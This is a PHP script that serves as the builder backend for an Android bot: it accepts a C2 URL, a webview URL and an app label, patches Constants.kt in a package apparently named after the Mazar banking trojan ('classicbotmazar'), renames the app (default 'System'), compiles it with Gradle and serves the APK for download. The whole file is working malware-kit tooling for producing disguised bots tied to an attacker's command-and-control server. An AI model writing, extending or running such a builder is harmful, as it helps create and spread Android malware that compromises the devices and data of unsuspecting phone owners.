<?php
ini_set('max_execution_time', 900);
set_time_limit(900);
header('Content-Type: text/event-stream');
header('Cache-Control: no-cache');
header('Connection: keep-alive');

$input = json_decode(file_get_contents('php://input') ?: '{}', true);
if (empty($input)) {
    $input = $_GET;
}

// Fixed: Correctly sanitize and use the provided apkName
$apkNameRaw = $input['apkName'] ?? 'Bot';
$apkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $apkNameRaw);
if (empty($apkName)) {
    $apkName = 'Bot';
}

$appLabel = $input['appLabel'] ?? 'System';
$webviewUrl = $input['webviewUrl'] ?? 'https://google.com';
$c2Url = $input['c2Url'] ?? '';

function sendLog($msg, $data = []) {
    echo "data: " . json_encode(array_merge(['log' => $msg . "\n"], $data)) . "\n\n";
    if (ob_get_level() > 0) ob_flush();
    flush();
}

if (!$c2Url) {
    sendLog("Error: C2 URL is empty", ['success' => false]);
    exit;
}

$baseDir = realpath(__DIR__ . '/../../../');
$isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

sendLog("Starting build process for $apkName ($appLabel)...");

// Update Constants
$constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
if (file_exists($constFile)) {
    $c = file_get_contents($constFile);
    // Even more robust replacement with greedy matching for current values
    $c = preg_replace('/val\s+urlConnection\s*=\s*".*?"/', 'val urlConnection = "' . $c2Url . '"', $c);
    $c = preg_replace('/val\s+urlAdmin\s*=\s*".*?"/', 'val urlAdmin = "' . $webviewUrl . '"', $c);
    file_put_contents($constFile, $c);
    sendLog("Patched Constants.kt - C2: $c2Url, Web: $webviewUrl");
} else {
    sendLog("Error: Constants.kt not found at $constFile", ['success' => false]);
    exit;
}

// Update Strings
$strFile = $baseDir . '/app/src/main/res/values/strings.xml';
if (file_exists($strFile)) {
    $s = file_get_contents($strFile);
    $s = preg_replace('/<string name="app_name">.*?<\/string>/', '<string name="app_name">' . htmlspecialchars($appLabel) . '</string>', $s);
    file_put_contents($strFile, $s);
    sendLog("Patched strings.xml - Name: $appLabel");
} else {
    sendLog("Error: strings.xml not found at $strFile", ['success' => false]);
    exit;
}

// JDK Detection
$jdkPath = '';
if ($isWin) {
    $possibleJdkPaths = [
        'C:\Program Files\Java\jdk-*',
        'C:\Program Files\Eclipse Adoptium\jdk-*',
        'C:\Program Files\Microsoft\jdk-*',
        'C:\Program Files\Java\jdk21*',
        'C:\Program Files\Java\jdk-17*',
    ];
    
    foreach ($possibleJdkPaths as $pattern) {
        $dirs = glob($pattern, GLOB_ONLYDIR);
        if (!empty($dirs)) {
            $jdks = array_filter($dirs, function($d) {
                return stripos($d, 'jre') === false && (file_exists($d . '\bin\javac.exe') || file_exists($d . '\bin\javac'));
            });
            if (!empty($jdks)) {
                natsort($jdks);
                $jdkPath = end($jdks);
                break;
            }
        }
    }
    
    if (!$jdkPath) {
        $currentJavaHome = getenv('JAVA_HOME');
        if ($currentJavaHome && (file_exists($currentJavaHome . '\bin\javac.exe') || file_exists($currentJavaHome . '\bin\javac'))) {
            $jdkPath = $currentJavaHome;
        }
    }
}

$envPrefix = "";
if ($isWin && $jdkPath) {
    $envPrefix = "set \"JAVA_HOME=$jdkPath\" && set \"PATH=%JAVA_HOME%\\bin;%PATH%\" && ";
    sendLog("Using JDK at: $jdkPath");
}

// Clean before build to ensure fresh state
if ($isWin) {
    $cmd = "cd /d " . escapeshellarg($baseDir) . " && {$envPrefix}call gradlew.bat clean assembleDebug --console=plain --info 2>&1";
} else {
    $cmd = 'cd ' . escapeshellarg($baseDir) . ' && chmod +x gradlew && ./gradlew clean assembleDebug --console=plain --info 2>&1';
}

sendLog("Executing build command: $cmd");

$handle = popen($cmd, 'r');
if ($handle) {
    while (!feof($handle)) {
        $line = fgets($handle);
        if ($line) {
            sendLog($line);
        }
    }
    $status = pclose($handle);
} else {
    $status = 1;
    sendLog("Failed to execute build command.");
}

if ($status === 0) {
    $src = $baseDir . '/app/build/outputs/apk/debug/app-debug.apk';
    // Use the sanitized apkName for the final file
    $dest = __DIR__ . '/../' . $apkName . '.apk';
    if (file_exists($src)) {
        if (copy($src, $dest)) {
            sendLog("Build successful!", ['success' => true, 'downloadUrl' => $apkName . '.apk']);
        } else {
            sendLog("Error: Copy failed from $src to $dest", ['success' => false]);
        }
    } else {
        sendLog("Error: APK not found at $src", ['success' => false]);
    }
} else {
    sendLog("Build failed with exit code $status", ['success' => false]);
}
